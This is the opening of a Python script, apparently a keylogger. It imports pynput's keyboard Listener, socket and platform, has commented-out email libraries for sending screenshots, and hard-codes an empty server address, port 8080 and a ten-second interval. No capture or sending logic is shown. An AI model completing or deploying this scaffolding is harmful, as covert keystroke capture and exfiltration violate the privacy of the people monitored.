# =========================================== Libraries ==============================================

# If needed for bigger code
# from email.mime.multipart import MIMEMultipart
# from email.mime.text import MIMEText
# from email.mime.base import MIMEBase
# from email import encoders
# import smtplib
# The libraries mentioned above are used to create and send an email containing the screenshots.

import socket  # Allows Python programs to communicate over networks
import platform  # provides information about the underlying platform on which the code is running

from pynput.keyboard import (
    Key,
    Listener,
)  # used to control and monitor input devices such as the keyboard and mouse

import time  # used for tasks like pausing code execution, measuring the time taken by code to run
import os  # provides a way to interact with the operating system and perform various system-level tasks


# =========================================== Hard code ==============================================

# server information
ip_address = ""
port_number = "8080"
# interal in seconds for the code's execution
time_interval = 10
